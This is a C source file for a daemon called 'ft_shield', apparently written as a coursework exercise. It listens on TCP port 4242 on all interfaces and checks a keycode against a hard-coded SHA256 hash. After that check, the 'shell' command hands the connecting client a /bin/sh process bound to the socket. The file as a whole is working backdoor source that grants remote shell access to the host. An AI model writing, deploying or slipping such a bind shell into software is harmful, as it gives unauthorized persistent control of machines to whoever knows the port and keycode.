#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <signal.h>
#include <sys/stat.h>
#include <errno.h>
#include <openssl/sha.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/wait.h>

#define PORT 4242
#define MAX_CLIENTS 3
#define BUFFER_SIZE 1024
#define LOCKFILE "/var/lock/ft_shield.lock"

// SHA256 hashes of passwords
#define PASSWORD_HASH "73475cb40a568e8da8a045ced110137e159f890ac4da883b6b17dc651b3a8049"

static int active_clients = 0;
pthread_mutex_t clients_mutex = PTHREAD_MUTEX_INITIALIZER;

char* hash_password(const char* input) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char*)input, strlen(input), hash);

    char* output = malloc(65);
    if (!output) return NULL;

    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(output + (i * 2), "%02x", hash[i]);
    }

    output[64] = '\0';
    return output;
}

int create_lockfile() {
    int fd = open(LOCKFILE, O_CREAT | O_EXCL | O_WRONLY, 0644);
    if (fd < 0) {
        if (errno == EEXIST) return 0; // Already running
        return -1;
    }
    close(fd);
    return 1;
}

void cleanup_lockfile() {
    remove(LOCKFILE);
}

void handle_sigterm(int sig) {
    (void)sig;
    cleanup_lockfile();
    pthread_mutex_destroy(&clients_mutex);
    exit(0);
}

int authenticate_client(int client_fd) {
    char buffer[BUFFER_SIZE];
    char *keycode_prompt = "Keycode: ";
    int auth_success = 0;

    while (!auth_success) {
        send(client_fd, keycode_prompt, strlen(keycode_prompt), 0);

        ssize_t bytes = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
        if (bytes <= 0) return 0;

        buffer[bytes] = '\0';
        char *newline = strchr(buffer, '\n');
        if (newline) *newline = '\0';

        char* input_hash = hash_password(buffer);
        if (!input_hash) return 0;

        auth_success = (strcmp(input_hash, PASSWORD_HASH) == 0);
        free(input_hash);

        if (!auth_success) {
            char *error_msg = "Access denied\n";
            send(client_fd, error_msg, strlen(error_msg), 0);
        }
    }

    return auth_success;
}

void handle_client_shell(int client_fd) {
    char *shell_msg = "Spawning shell on port 4242\n";
    send(client_fd, shell_msg, strlen(shell_msg), 0);

    pid_t pid = fork();
    if (pid == 0) {
        dup2(client_fd, STDIN_FILENO);
        dup2(client_fd, STDOUT_FILENO);
        dup2(client_fd, STDERR_FILENO);
        execl("/bin/sh", "/bin/sh", NULL);
        exit(1);
    } else if (pid > 0) {
        waitpid(pid, NULL, 0);
    }
}

void handle_client_commands(int client_fd) {
    char buffer[BUFFER_SIZE];
    char *prompt = "$> ";

    while (1) {
        send(client_fd, prompt, strlen(prompt), 0);

        ssize_t bytes = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
        if (bytes <= 0) break;

        buffer[bytes] = '\0';
        char *newline = strchr(buffer, '\n');
        if (newline) *newline = '\0';

        if (strcmp(buffer, "shell") == 0) {
            handle_client_shell(client_fd);
            break;
        } else if (strcmp(buffer, "?") == 0) {
            char *help = "? show help\nshell Spawn remote shell on 4242\n";
            send(client_fd, help, strlen(help), 0);
        } else if (strlen(buffer) == 0) {
            continue;
        } else {
            char *unknown = "Unknown command\n";
            send(client_fd, unknown, strlen(unknown), 0);
        }
    }
}

typedef struct {
    int client_fd;
} client_args_t;

void* client_thread(void* arg) {
    client_args_t* args = (client_args_t*)arg;
    int client_fd = args->client_fd;
    free(args);

    if (authenticate_client(client_fd)) {
        handle_client_commands(client_fd);
    }

    close(client_fd);

    pthread_mutex_lock(&clients_mutex);
    active_clients--;
    pthread_mutex_unlock(&clients_mutex);

    return NULL;
}

int main() {
    if (create_lockfile() == 0) exit(0);
    signal(SIGTERM, handle_sigterm);
    signal(SIGINT, handle_sigterm);

    int server_fd, client_fd;
    struct sockaddr_in address;
    int addrlen = sizeof(address);

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        cleanup_lockfile();
        exit(EXIT_FAILURE);
    }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        cleanup_lockfile();
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, MAX_CLIENTS) < 0) {
        cleanup_lockfile();
        exit(EXIT_FAILURE);
    }

    while (1) {
        if ((client_fd = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            continue;
        }

        pthread_mutex_lock(&clients_mutex);
        if (active_clients >= MAX_CLIENTS) {
            pthread_mutex_unlock(&clients_mutex);
            char *max_clients_msg = "Maximum number of clients reached\n";
            send(client_fd, max_clients_msg, strlen(max_clients_msg), 0);
            close(client_fd);
            continue;
        }
        active_clients++;
        pthread_mutex_unlock(&clients_mutex);

        client_args_t* args = malloc(sizeof(client_args_t));
        if (!args) {
            close(client_fd);
            continue;
        }
        args->client_fd = client_fd;
 
        pthread_t tid;
        if (pthread_create(&tid, NULL, client_thread, args) != 0) {
            perror("pthread_create");
            close(client_fd);
            free(args);
            pthread_mutex_lock(&clients_mutex);
            active_clients--;
            pthread_mutex_unlock(&clients_mutex);
        } else {
            pthread_detach(tid);
        }
    }

    cleanup_lockfile();
    pthread_mutex_destroy(&clients_mutex);
    return EXIT_SUCCESS;
}
